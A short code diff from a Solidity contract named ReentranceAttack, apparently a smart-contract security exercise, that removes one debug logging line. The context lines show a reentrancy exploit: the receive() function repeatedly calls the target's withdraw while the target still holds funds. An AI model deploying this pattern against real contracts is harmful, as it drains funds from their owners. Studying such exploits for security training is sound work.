@@ -38,7 +38,6 @@ contract ReentranceAttack {
 
     receive() external payable {
         uint targetBalance = address(targetContract).balance;
-        console.log(targetBalance);
         if (targetBalance > targetValue) {
             targetContract.withdraw(targetValue); 
         }
